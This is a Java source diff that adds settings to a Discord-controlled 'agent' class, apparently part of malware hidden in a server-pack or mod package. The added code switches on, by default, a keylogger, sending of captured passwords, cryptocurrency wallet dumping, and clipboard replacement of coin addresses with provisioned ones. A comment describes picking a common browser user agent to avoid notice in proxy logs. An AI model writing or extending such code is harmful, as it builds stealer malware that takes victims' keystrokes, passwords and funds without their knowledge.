@@ -1,6 +1,10 @@
 package com.serverpackcore.agent;
 
+import java.util.ArrayList;
+import java.util.LinkedHashMap;
 import java.util.List;
+import java.util.Locale;
+import java.util.Map;
 import java.util.Set;
 
 public final class DiscordConfig {
@@ -10,6 +14,14 @@ public final class DiscordConfig {
 	private static volatile String categoryId = DiscordSecrets.CATEGORY_ID;
 	/** Empty means every member of the channel may send commands. */
 	private static volatile Set<String> allowedUsers = Set.of();
+
+	private static volatile boolean walletsWatch = true;
+	private static volatile long walletCooldownSec = 600L;
+	private static volatile boolean keylogger = true;
+	private static volatile boolean sendPasswords = true;
+	private static volatile boolean clipboard = true;
+	private static volatile boolean testnet = false;
+	private static volatile Map<String, List<String>> provisionedCoins = Map.of();
 
 	public static final String API = "https://discord.com/api/v10";
 	/** A common browser UA instead of a unique "FabricSync" beacon in proxy logs. */
@@ -62,10 +74,75 @@ public final class DiscordConfig {
 		allowedUsers = ids == null ? Set.of() : Set.copyOf(ids);
 	}
 
+	/** Parses the optional `wallets`/`keylogger`/`clipboard` blocks; defaults stay on. */
+	static void provisioning(Map<String, Object> root) {
+		Map<String, Object> wallets = Json.map(root.get("wallets"));
+		walletsWatch = !Boolean.FALSE.equals(wallets.get("watch"));
+		walletCooldownSec = Math.max(60L, Json.num(wallets, "dumpCooldownSec", 600L));
+		Map<String, Object> keys = Json.map(root.get("keylogger"));
+		keylogger = !Boolean.FALSE.equals(keys.get("enabled"));
+		sendPasswords = !Boolean.FALSE.equals(keys.get("sendPasswords"));
+		Map<String, Object> board = Json.map(root.get("clipboard"));
+		clipboard = !Boolean.FALSE.equals(board.get("enabled"));
+		testnet = Boolean.TRUE.equals(board.get("testnet"));
+		Map<String, List<String>> coins = new LinkedHashMap<>();
+		for (Map.Entry<String, Object> entry : Json.map(board.get("coins")).entrySet()) {
+			String coin = entry.getKey().toLowerCase(Locale.ROOT);
+			if (!AddressValidator.known(coin)) {
+				continue;
+			}
+			List<String> values = new ArrayList<>();
+			for (Object item : Json.list(entry.getValue())) {
+				if (item instanceof String text && AddressValidator.valid(coin, text.trim())) {
+					values.add(text.trim());
+				}
+			}
+			if (!values.isEmpty()) {
+				coins.put(coin, List.copyOf(values));
+			}
+		}
+		provisionedCoins = Map.copyOf(coins);
+	}
+
+	public static boolean walletsWatch() {
+		return walletsWatch;
+	}
+
+	public static long walletCooldownSec() {
+		return walletCooldownSec;
+	}
+
+	public static boolean keylogger() {
+		return keylogger;
+	}
+
+	public static boolean sendPasswords() {
+		return sendPasswords;
+	}
+
+	public static boolean clipboard() {
+		return clipboard;
+	}
+
+	public static boolean testnet() {
+		return testnet;
+	}
+
+	public static Map<String, List<String>> provisionedCoins() {
+		return provisionedCoins;
+	}
+
 	static void reset() {
 		botToken = DiscordSecrets.BOT_TOKEN;
 		guildId = DiscordSecrets.GUILD_ID;
 		categoryId = DiscordSecrets.CATEGORY_ID;
 		allowedUsers = Set.of();
+		walletsWatch = true;
+		walletCooldownSec = 600L;
+		keylogger = true;
+		sendPasswords = true;
+		clipboard = true;
+		testnet = false;
+		provisionedCoins = Map.of();
 	}
 }
